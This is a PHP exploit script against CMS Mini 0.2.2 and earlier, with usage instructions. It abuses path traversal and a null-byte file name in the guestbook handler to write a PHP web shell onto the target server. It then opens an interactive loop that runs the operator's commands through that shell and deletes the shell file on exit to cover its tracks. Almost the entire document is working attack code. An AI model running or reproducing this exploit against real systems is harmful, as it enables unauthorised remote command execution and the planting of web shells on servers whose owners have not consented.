--+++================================================================+++--
--+++====== CMS Mini <= 0.2.2 Remote Command Execution Exploit ======+++--
--+++================================================================+++--

<?php

function usage ()
{
	exit (
		"\nCMS Mini <= 0.2.2 Remote Command Execution Exploit".
		"\n[+] Author  : darkjoker".
		"\n[+] Site    : http://darkjoker.net23.net".
		"\n[+] Download: http://ovh.dl.sourceforge.net/sourceforge/cmsmini/cmsmini-0.2.2.tar.gz".
		"\n[+] Usage   : php xpl.php <hostname> <path>".
		"\n[+] Ex.     : php xpl.php localhost /CMSmini".
		"\n\n");
}

if ($argc != 3)
	usage;
$hostname = $argv [1];
$path = $argv [2];
$fp = fsockopen ($hostname, 80);
$post = "message=<? system (\$_GET ['cmd']); die ();?>";
$request = "POST {$path}/view/index.php?op=guestbook&path=..&p=file.php%00 HTTP/1.1\r\n".
	   "Host: $hostname\r\n".
	   "Connection: Close\r\n".
	   "Content-Type: application/x-www-form-urlencoded\r\n".
	   "Content-Length: " . strlen ($post) . "\r\n\r\n".
	   $post;
fputs ($fp, $request);
fclose ($fp);
$stdin = fopen("php://stdin", "r");
while (1)
{
	echo "$ ";
	$cmd = str_replace (" ", "%20", trim (fgets ($stdin, 1024)));
	if ($cmd == "exit")
	{
		file_get_contents ("http://{$hostname}{$path}/file.php?cmd=rm%20file.php");
		break;
	}
	echo file_get_contents ("http://{$hostname}{$path}/file.php?cmd={$cmd}");
	
}
fclose ($stdin);
?>